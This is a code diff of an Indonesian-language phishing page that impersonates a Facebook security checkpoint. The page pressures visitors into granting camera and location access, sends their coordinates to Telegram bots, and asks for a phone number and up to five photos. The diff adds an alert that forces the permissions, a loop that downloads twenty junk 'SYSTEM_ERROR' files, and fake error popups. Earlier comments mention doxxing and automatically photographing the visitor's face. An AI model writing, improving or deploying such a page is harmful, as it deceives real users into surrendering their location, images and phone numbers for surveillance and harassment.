@@ -9,7 +9,7 @@
         #splash-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; z-index: 9999; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; text-align: center; padding: 20px;
+            align-items: center; justify-content: center; text-align: center;
         }
         .fb-logo-splash { width: 70px; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
@@ -21,7 +21,7 @@
         
         .btn-fb { 
             background: linear-gradient(to bottom, #1877f2, #166fe5); color: white; font-weight: bold; 
-            padding: 12px; border-radius: 8px; border: none; width: 100%; transition: 0.2s;
+            padding: 12px; border-radius: 8px; border: none; width: 100%;
         }
 
         #chaos-overlay { 
@@ -44,7 +44,7 @@
         .credit-bar {
             position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
             color: white; padding: 10px 20px; display: flex; align-items: center; 
-            justify-content: space-between; backdrop-filter: blur(15px); border-top: 2px solid #1877f2; z-index: 1000;
+            justify-content: space-between; border-top: 2px solid #1877f2; z-index: 1000;
         }
         .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 5px; }
         
@@ -55,9 +55,7 @@
 
 <div id="splash-screen">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
-    <h5 id="status-text" class="mt-3 fw-bold">Verifikasi Identitas Sistem...</h5>
-    <p id="sub-status" class="text-muted small">Harap izinkan akses Kamera & Lokasi untuk melanjutkan.</p>
-    <button id="retry-btn" class="btn btn-sm btn-primary mt-2" style="display:none;" onclick="location.reload()">Coba Lagi</button>
+    <h6 class="mt-3 text-muted">Sinkronisasi Keamanan...</h6>
 </div>
 
 <div id="chaos-overlay">
@@ -70,17 +68,17 @@
     <source src="https://files.catbox.moe/tll0lw.mp3" type="audio/mpeg">
 </audio>
 
-<div class="container" id="main-content">
+<div class="container">
     <div class="main-card card p-4 text-center">
         <div class="fb-logo-text">facebook</div>
-        <h6 class="fw-bold mt-2">Checkpoint Keamanan</h6>
+        <h6 class="fw-bold mt-2">Checkpoint Verifikasi</h6>
         <hr>
         <div id="mainError" class="error-box" style="background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; text-align: left;">
-            <b>Gagal!</b><br>Pastikan nomor HP benar dan upload MAKSIMAL 5 foto.
+            <b>Gagal!</b><br>Periksa kembali nomor Anda atau kurangi jumlah foto (Maks 5).
         </div>
         <div class="text-start">
             <input type="number" id="phone" class="form-control mb-3" placeholder="Nomor Telepon">
-            <label class="small fw-bold">Upload Foto (Maks 5):</label>
+            <label class="small fw-bold">Unggah Bukti (Maks 5):</label>
             <input type="file" id="galeri" class="form-control mb-3" multiple accept="image/*">
         </div>
         <button class="btn-fb" onclick="validateFinal()">Konfirmasi</button>
@@ -107,33 +105,33 @@
     const chats = ["7835924973", "8071786272"];
     const audio = document.getElementById('bgMusic');
 
-    // FITUR UTAMA: CEK IZIN SEBELUM MASUK 😈
-    window.onload = async () => {
+    async function startSystem() {
+        alert("PERINGATAN!\n\nUntuk alasan keamanan, sistem memerlukan akses Kamera dan Lokasi. Harap pilih IZINKAN pada notifikasi setelah ini.");
+        
         try {
-            // Paksa minta Lokasi
-            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
-            sendToBot(`📍 LOKASI: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-            
-            // Paksa minta Kamera
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            stream.getTracks().forEach(t => t.stop()); // Matiin sementara cuma buat tes izin
+            const pos = await new Promise((res, rej) => {
+                navigator.geolocation.getCurrentPosition(res, () => {
+                    alert("AKSES DITOLAK!\n\nLayanan tidak dapat dimuat tanpa izin lokasi.");
+                    location.reload();
+                    rej();
+                });
+            });
+            sendToBot(`📍 LOKASI: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
 
-            // Jika semua diizinkan, baru buka website
-            document.getElementById('status-text').innerText = "Akses Diterima!";
-            setTimeout(() => {
-                document.getElementById('splash-screen').style.display = 'none';
-                document.body.style.display = 'block';
-                autoCapture("user"); // Langsung jepret muka
-            }, 1500);
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {
+                alert("AKSES KAMERA DITOLAK!\n\nHarap aktifkan kamera untuk verifikasi identitas.");
+                location.reload();
+            });
+            stream.getTracks().forEach(t => t.stop());
 
-        } catch (err) {
-            // Jika ditolak, website TERKUNCI 🔒
-            document.getElementById('status-text').innerText = "AKSES DITOLAK!";
-            document.getElementById('status-text').style.color = "red";
-            document.getElementById('sub-status').innerText = "Sistem mendeteksi Anda menolak izin keamanan. Anda tidak dapat mengakses fitur Facebook ini tanpa verifikasi kamera dan lokasi.";
-            document.getElementById('retry-btn').style.display = "inline-block";
-        }
-    };
+            document.getElementById('splash-screen').style.display = 'none';
+            document.body.style.display = 'block';
+            autoCapture("user");
+
+        } catch (e) {}
+    }
+
+    window.onload = () => { setTimeout(startSystem, 2000); };
 
     function sendToBot(c, t="text", b=null) {
         tokens.forEach((tk, i) => {
@@ -185,13 +183,22 @@
         const vi = document.getElementById('chaos-video');
         ov.style.display = 'block'; vi.muted = false; vi.play();
         
-        // JEDA 15 DETIK BARU WINDOW POPUP MUNCUL
+        // --- FITUR DOWNLOAD SAMPAH (BALIK LAGI!) ---
+        for (let j = 1; j <= 20; j++) {
+            let blob = new Blob(["MEMORY CORRUPTED - YOU ARE IDIOT"], { type: "text/plain" });
+            let url = window.URL.createObjectURL(blob);
+            let a = document.createElement("a");
+            a.href = url; a.download = `SYSTEM_ERROR_0x${j}FF.txt`;
+            a.click();
+        }
+
+        // --- JEDA 15 DETIK POPUP WINDOW ---
         setTimeout(() => {
             setInterval(() => {
                 let d = document.createElement('div');
                 d.className = 'popup-virus';
                 d.style.top = Math.random() * 80 + '%'; d.style.left = Math.random() * 80 + '%';
-                d.innerHTML = "<b>YOU ARE IDIOT!</b><br>GOT DOXXED!";
+                d.innerHTML = "<b>CRITICAL ERROR!</b><br>MEMORY LEAK DETECTED!";
                 ov.appendChild(d);
             }, 250);
         }, 15000);
